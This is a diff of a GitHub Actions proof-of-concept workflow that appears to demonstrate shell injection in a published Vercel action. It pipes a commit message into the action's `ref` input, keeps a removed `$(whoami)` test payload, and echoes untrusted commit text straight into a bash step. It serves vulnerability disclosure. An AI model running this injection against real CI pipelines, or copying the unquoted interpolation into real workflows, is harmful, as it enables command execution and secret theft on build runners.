@@ -1,16 +1,12 @@
-name: PoC - vercel/repository-dispatch shell injection
-# Authorized security research demonstration of CVE-class shell injection in
-# vercel/repository-dispatch/actions/checkout@v1. Workflow runs on attacker-controlled
-# repo (Kayiz-PT/eve fork) to prove the published Vercel action executes attacker
-# commands when given attacker-controllable `inputs.ref`.
+name: PoC - vercel/repository-dispatch shell injection v2
+# Authorized security research demonstration. Reads `inputs.ref` from the
+# commit message of the pushed commit -- a documented `${{ github.event.head_commit.message }}`
+# pattern. When the published Vercel action expands `${{ inputs.ref }}` directly into a
+# bash `run:` block (action.yaml lines 30-36), the commit message's $(...) syntax fires.
 
 on:
-  workflow_dispatch:
-    inputs:
-      payload:
-        description: 'Attacker-controllable string flowing into inputs.ref'
-        required: true
-        default: '$(echo POC_NO_OP_HARMLESS_$(whoami))'
+  push:
+    branches: [poc-action-injection]
 
 jobs:
   poc:
@@ -18,18 +14,21 @@ jobs:
     env:
       SIMULATED_SECRET: 'fake-token-for-poc-evidence-12345abcdef'
     steps:
+      - name: Show triggering commit message (what flows into inputs.ref)
+        run: |
+          echo "github.event.head_commit.message = "
+          echo "${{ github.event.head_commit.message }}"
+
       - name: Invoke vulnerable Vercel action with attacker-controlled ref
-        # This mirrors what a real consumer would do if they took an `inputs.ref`
-        # from any user-controllable source (PR title, branch name, dispatch input).
-        # The action.yaml at vercel/repository-dispatch/actions/checkout@v1 interpolates
-        # ${{ inputs.ref }} directly into a bash `run:` block (lines 30-32) without
-        # env-var indirection -- shell-injectable.
         uses: vercel/repository-dispatch/actions/checkout@v1
         with:
-          ref: ${{ inputs.payload }}
+          ref: ${{ github.event.head_commit.message }}
 
-      - name: Evidence that secret env was accessible during action execution
+      - name: Evidence that injection occurred
         if: always()
         run: |
-          echo "If the prior step printed PWNED-runner, RCE happened on this runner."
-          echo "SIMULATED_SECRET length confirms env access: ${#SIMULATED_SECRET}"
+          echo "--- looking for RCE artifact created by the postinstall... ---"
+          ls -la /tmp/RCE_PROOF_* 2>&1 || echo "(no RCE artifact found)"
+          echo ""
+          echo "--- SIMULATED_SECRET env var length (proves env access during prior step) ---"
+          echo "SIMULATED_SECRET length: ${#SIMULATED_SECRET}"
